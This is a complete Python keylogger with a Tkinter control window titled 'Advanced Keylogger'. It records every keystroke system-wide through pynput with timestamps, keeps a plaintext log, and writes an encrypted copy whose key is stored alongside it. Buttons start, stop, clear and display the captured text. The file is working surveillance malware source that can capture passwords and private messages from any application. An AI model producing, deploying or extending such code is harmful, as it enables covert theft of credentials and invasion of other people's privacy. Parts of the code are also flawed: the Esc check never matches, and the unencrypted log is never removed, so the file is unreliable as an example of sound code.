import tkinter as tk
from pynput.keyboard import Listener
from cryptography.fernet import Fernet
import time
import os

# Global variables
keylog_file = "keylog.txt"
encrypted_file = "keylog_encrypted.txt"
encryption_key_file = "key.key"
is_logging = False
cipher_suite = None


# Generate or load encryption key
def load_or_generate_key():
    global cipher_suite
    if not os.path.exists(encryption_key_file):
        key = Fernet.generate_key()
        with open(encryption_key_file, "wb") as key_file:
            key_file.write(key)
    else:
        with open(encryption_key_file, "rb") as key_file:
            key = key_file.read()
    cipher_suite = Fernet(key)


def on_press(key):
    if is_logging:
        try:
            log_entry = f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {key.char}\n"
        except AttributeError:
            log_entry = f"{time.strftime('%Y-%m-%d %H:%M:%S')} - [{key}]\n"

        with open(keylog_file, "a") as f:
            f.write(log_entry)

        # Encrypt the log file after each entry
        encrypt_log()


def encrypt_log():
    with open(keylog_file, "rb") as f:
        log_data = f.read()
    encrypted_data = cipher_suite.encrypt(log_data)
    with open(encrypted_file, "wb") as f:
        f.write(encrypted_data)


def start_logging():
    global is_logging
    is_logging = True
    log_status.set("Logging: ON")


def stop_logging():
    global is_logging
    is_logging = False
    log_status.set("Logging: OFF")


def clear_log():
    with open(keylog_file, "w") as f:
        f.write("")  # Clear the log file
    encrypt_log()  # Clear the encrypted log file as well


def show_log():
    try:
        with open(encrypted_file, "rb") as f:
            encrypted_data = f.read()
        decrypted_data = cipher_suite.decrypt(encrypted_data).decode()
    except Exception as e:
        decrypted_data = f"Error decrypting log file: {e}"

    log_display.delete(1.0, tk.END)
    log_display.insert(tk.END, decrypted_data)


# Tkinter GUI setup
root = tk.Tk()
root.title("Advanced Keylogger")

log_status = tk.StringVar(value="Logging: OFF")

start_button = tk.Button(root, text="Start Logging", command=start_logging)
start_button.pack(pady=5)

stop_button = tk.Button(root, text="Stop Logging", command=stop_logging)
stop_button.pack(pady=5)

clear_button = tk.Button(root, text="Clear Log", command=clear_log)
clear_button.pack(pady=5)

show_button = tk.Button(root, text="Show Log", command=show_log)
show_button.pack(pady=5)

log_label = tk.Label(root, textvariable=log_status)
log_label.pack(pady=5)

log_display = tk.Text(root, height=10, width=50)
log_display.pack(pady=10)


def on_release(key):
    if key == 'Key.esc':
        return False


# Initialize encryption
load_or_generate_key()

# Start the keylogger in the background
listener = Listener(on_press=on_press, on_release=on_release)
listener.start()

root.mainloop()
